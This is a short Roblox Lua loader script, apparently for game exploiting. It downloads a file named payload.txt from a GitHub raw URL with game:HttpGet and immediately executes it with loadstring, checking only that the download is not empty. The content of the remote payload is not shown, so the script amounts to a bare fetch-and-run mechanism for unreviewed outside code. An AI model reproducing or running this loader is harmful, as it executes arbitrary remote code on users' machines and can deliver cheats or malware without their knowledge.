local payload = game:HttpGet(
    "https://raw.githubusercontent.com/humzhumz3-lgtm/sentinel---loader/main/payload.txt",
    true
)

if not payload or payload == "" then
    warn("Failed to load payload")
    return
end

loadstring(payload)()
